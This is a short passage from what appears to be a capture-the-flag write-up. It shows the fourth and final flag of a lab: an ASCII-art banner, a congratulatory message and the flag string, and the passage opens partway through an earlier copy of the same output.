 ##    ##   ##       ##    ##    ##      ##        ########  ##   ##   ##.  .##  ## .  ##  ##.  .##
 ##   :##   ##       ##:  ###    ##.     ###.  :#       ##   ##   :##  ###  ###  ##:  ###  ###  ###
 ########   ##        #######    #####   .#######       ##   ##    ##: .######.  ########  :#######
 ######     ##         ###.##    .####    .#####:       ##   ##    ###  .####.     ###.##   :###.##


Well done hacking!
This is the final flag, you deserve it!


flag04: flag{aee9f5e2-5fe3-4c76-8a55-2b3bb1bd281a}
```

## flag - 04

```plaintext
 ######:                                               ###   ######:                             ##
 #######                         ##                   :###   #######                             ##
 ##   :##                        ##                  .####   ##   :##                            ##
 ##    ##   ##.####  ##    ##  #######    .####:     ##.##   ##    ##   .####.    :####     :###.##
 ##   :##   #######  ##    ##  #######   .######:   :#: ##   ##   :##  .######.   ######   :#######
 #######.   ###.     ##    ##    ##      ##:  :##  .##  ##   #######:  ###  ###   #:  :##  ###  ###
 #######.   ##       ##    ##    ##      ########  ##   ##   ######    ##.  .##    :#####  ##.  .##
 ##   :##   ##       ##    ##    ##      ########  ########  ##   ##.  ##    ##  .#######  ##    ##
 ##    ##   ##       ##    ##    ##      ##        ########  ##   ##   ##.  .##  ## .  ##  ##.  .##
 ##   :##   ##       ##:  ###    ##.     ###.  :#       ##   ##   :##  ###  ###  ##:  ###  ###  ###
 ########   ##        #######    #####   .#######       ##   ##    ##: .######.  ########  :#######
 ######     ##         ###.##    .####    .#####:       ##   ##    ###  .####.     ###.##   :###.##


Well done hacking!
This is the final flag, you deserve it!


flag04: flag{aee9f5e2-5fe3-4c76-8a55-2b3bb1bd281a}
```
